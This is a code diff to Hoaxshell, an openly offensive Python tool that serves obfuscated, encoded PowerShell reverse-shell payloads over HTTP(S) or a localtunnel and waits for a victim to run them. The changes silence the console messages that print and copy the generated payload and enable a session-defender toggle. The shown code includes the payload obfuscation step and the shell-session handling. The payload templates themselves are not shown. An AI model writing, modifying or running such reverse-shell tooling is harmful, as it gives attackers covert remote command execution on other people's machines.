@@ -477,7 +477,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			session_check.daemon = True
 			session_check.start()
 			print(f'\r[{GREEN}Shell{END}] {BOLD}Payload execution verified!{END}')
-			# Session_Defender.is_active = not Session_Defender.is_active
+			Session_Defender.is_active = not Session_Defender.is_active
 			print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt...{END}', end = '\n\n') #end = ''
 			print(f'\r[{IMPORTANT}] You can\'t change dir while utilizing --exec-outfile (-x) option. Your commands must include absolute paths to files, etc.') if args.exec_outfile else chill()
 			Hoaxshell.prompt_ready = False
@@ -716,7 +716,7 @@ def main():
 		
 		# Generate payload
 		if not args.grab:
-			print(f'[{INFO}] Generating reverse shell payload...')
+			# print(f'[{INFO}] Generating reverse shell payload...')
 
 			if args.localtunnel:
 				source = open(f'{cwd}/payload_templates/https_payload_localtunnel.ps1', 'r') if not args.exec_outfile else open('./payload_templates/https_payload_localtunnel_outfile.ps1', 'r')
@@ -756,25 +756,25 @@ def main():
 					obf = str(uuid.uuid4())[0:_max]
 					
 					payload = payload.replace(var, f'${obf}')
-			print(f"payload {payload}")
+			# print(f"payload {payload}")
 			if not args.raw_payload:
 				payload = encodePayload(payload)
 
-			print(f'{PLOAD}{payload}{END}')
+			# print(f'{PLOAD}{payload}{END}')
 			
 			# Copy payload to clipboard
-			try:
-				copy2cb(payload)
-				print(f'{ORANGE}Copied to clipboard!{END}')
-			except:
-				pass
+			# try:
+			# 	copy2cb(payload)
+			# 	print(f'{ORANGE}Copied to clipboard!{END}')
+			# except:
+			# 	pass
 
 			print(f'[{INFO}] Tunneling [{BOLD}{ORANGE}ON{END}]') if tunneling else chill()
 			
 			if tunneling:
 				print(f'[{INFO}] Server Address: {BOLD}{BLUE}{t_server}{END}')
 
-			print(f'[{INFO}] Type "help" to get a list of the available prompt commands.')
+			# print(f'[{INFO}] Type "help" to get a list of the available prompt commands.')
 			print(f'[{INFO}] Https Server started on port {server_port}.') if ssl_support else print(f'[{INFO}] Http Server started on port {server_port}.')
 			print(f'[{IMPORTANT}] {BOLD}Awaiting payload execution to initiate shell session...{END}')
 
